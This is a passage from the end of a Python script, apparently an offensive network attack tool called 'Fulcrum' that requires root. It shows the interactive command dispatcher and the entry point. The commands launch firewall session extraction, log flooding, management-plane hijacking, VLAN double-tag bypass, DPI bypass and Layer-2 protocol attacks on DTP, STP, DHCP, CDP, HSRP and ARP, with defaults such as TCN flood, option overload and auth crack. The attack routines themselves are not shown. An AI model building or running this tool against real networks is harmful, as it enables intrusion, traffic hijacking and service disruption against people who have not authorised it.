                    print('Usage: fw-session-extract <IP> [community]')
                else:
                    community = cmd[2] if len(cmd) > 2 else "public"
                    firewall_session_extraction(iface, cmd[1], community)
            elif c == 'fw-admin-track':
                if len(cmd) < 2:
                    print('Usage: fw-admin-track <IP> [community]')
                else:
                    community = cmd[2] if len(cmd) > 2 else "public"
                    firewall_admin_tracking(iface, cmd[1], community)
            elif c == 'fw-log-flood':
                if len(cmd) < 2:
                    print('Usage: fw-log-flood <IP>')
                else:
                    firewall_log_flood(iface, cmd[1])

            # Add advanced protocol exploit commands
            elif c == 'advanced-dtp':
                if len(cmd) < 3:
                    print('Usage: advanced-dtp <target_mac> [attack_type]')
                else:
                    attack_type = cmd[2] if len(cmd) > 2 else "all"
                    advanced_dtp_exploit(iface, cmd[1], attack_type)
            
            elif c == 'advanced-stp':
                if len(cmd) < 2:
                    print('Usage: advanced-stp [attack_type]')
                else:
                    attack_type = cmd[1] if len(cmd) > 1 else "tcn_flood"
                    advanced_stp_exploit(iface, attack_type)
            
            elif c == 'advanced-dhcp':
                if len(cmd) < 2:
                    print('Usage: advanced-dhcp [attack_type]')
                else:
                    attack_type = cmd[1] if len(cmd) > 1 else "option_overload"
                    advanced_dhcp_exploit(iface, attack_type)
            
            elif c == 'advanced-cdp':
                if len(cmd) < 3:
                    print('Usage: advanced-cdp <target_mac> [exploit_type]')
                else:
                    exploit_type = cmd[2] if len(cmd) > 2 else "version_overflow"
                    cdp_protocol_exploit(iface, cmd[1], exploit_type)
            
            elif c == 'advanced-hsrp':
                if len(cmd) < 3:
                    print('Usage: advanced-hsrp <vip> [attack_type]')
                else:
                    attack_type = cmd[2] if len(cmd) > 2 else "auth_crack"
                    hsrp_authentication_bypass(iface, cmd[1], attack_type=attack_type)
            
            elif c == 'advanced-arp':
                if len(cmd) < 3:
                    print('Usage: advanced-arp <target_ip> [attack_type]')
                else:
                    attack_type = cmd[2] if len(cmd) > 2 else "arp_stack"
                    advanced_arp_exploit(iface, cmd[1], attack_type)

            elif c == 'fw-failover-test':
                if len(cmd) < 2:
                    print('Usage: fw-failover-test <IP>')
                else:
                    firewall_failover_test(iface, cmd[1])
            elif c == 'fw-policy-clone':
                if len(cmd) < 2:
                    print('Usage: fw-policy-clone <IP>')
                else:
                    firewall_policy_cloning(iface, cmd[1])
            elif c == 'fw-vlan-bypass':
                if len(cmd) < 2:
                    print('Usage: fw-vlan-bypass <IP> [inner_vlan] [outer_vlan]')
                else:
                    inner_vlan = int(cmd[2]) if len(cmd) > 2 else 100
                    outer_vlan = int(cmd[3]) if len(cmd) > 3 else 200
                    firewall_vlan_bypass(iface, cmd[1], inner_vlan, outer_vlan)
            elif c == 'fw-nat-extract':
                if len(cmd) < 2:
                    print('Usage: fw-nat-extract <IP>')
                else:
                    firewall_nat_extraction(iface, cmd[1])
            elif c == 'fw-mgmt-hijack':
                if len(cmd) < 3:
                    print('Usage: fw-mgmt-hijack <IP> <gateway_ip>')
                else:
                    firewall_mgmt_hijack(iface, cmd[1], cmd[2])
            elif c == 'fw-dpi-bypass':
                if len(cmd) < 2:
                    print('Usage: fw-dpi-bypass <IP>')
                else:
                    firewall_dpi_bypass(iface, cmd[1])
            elif c == 'stop-traffic':
                global active_traffic
                active_traffic = False
                # Stop all L2 attacks
                for attack in list(l2_attacks_active.keys()):
                    l2_attacks_active[attack] = False
                print("[Traffic] Stopping all traffic generation and attacks")
            elif c == 'exit':
                print('Exiting.')
                break
            else:
                print(f"Unknown command: {c}")
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit")
        except Exception as e:
            print(f"Error: {e}")

# Entry point
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Fulcrum')
    parser.add_argument('--iface', required=True, help='Ethernet interface (e.g. eth0)')
    parser.add_argument('--cidr', default='10.1.1.0/24', help='CIDR for ARP scan')
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("This tool requires root privileges. Please run with sudo.")
        exit(1)
    
    # Check if the interface exists
    try:
        get_if_hwaddr(args.iface)
    except:
        print(f"Interface {args.iface} not found or not accessible.")
        print("Available interfaces:")
        try:
            if platform.system() == "Linux":
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
                interfaces = [line.split(':')[1].strip() for line in result.stdout.split('\n') if ':' in line and 'lo:' not in line]
                for iface in interfaces:
                    print(f"  {iface}")
            elif platform.system() == "Windows":
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                print(result.stdout)
        except:
            pass
        exit(1)
    
    run_chat(args.iface, args.cidr)
